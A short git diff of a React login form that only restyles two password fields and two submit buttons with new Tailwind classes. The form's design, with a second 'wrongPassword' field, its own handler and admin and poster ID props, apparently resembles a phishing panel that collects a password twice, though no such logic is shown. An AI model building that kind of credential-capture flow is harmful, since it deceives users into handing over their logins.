@@ -73,7 +73,7 @@ function LoginForm({ adminId, posterId, setImage }) {
               {!showWrongPassword ? (
                 <>
                   <Field
-                    className=" px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
+                    className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
                     placeholder="Password"
                     name="password"
                     type="password"
@@ -83,7 +83,7 @@ function LoginForm({ adminId, posterId, setImage }) {
                 </>
               ) : (
                 <Field
-                  className=" px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
+                  className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
                   placeholder="Password"
                   name="wrongPassword"
                   type="password"
@@ -96,7 +96,7 @@ function LoginForm({ adminId, posterId, setImage }) {
                 <button
                   type="button"
                   onClick={handleWrongPassword}
-                  className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
+                  className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
                 >
                   SUBMIT
                 </button>
@@ -104,7 +104,7 @@ function LoginForm({ adminId, posterId, setImage }) {
                 <button
                   type="submit"
                   // type="button"
-                  className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
+                  className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
                   // disabled={!verified}
                   // onClick={handleNextStep}
                 >
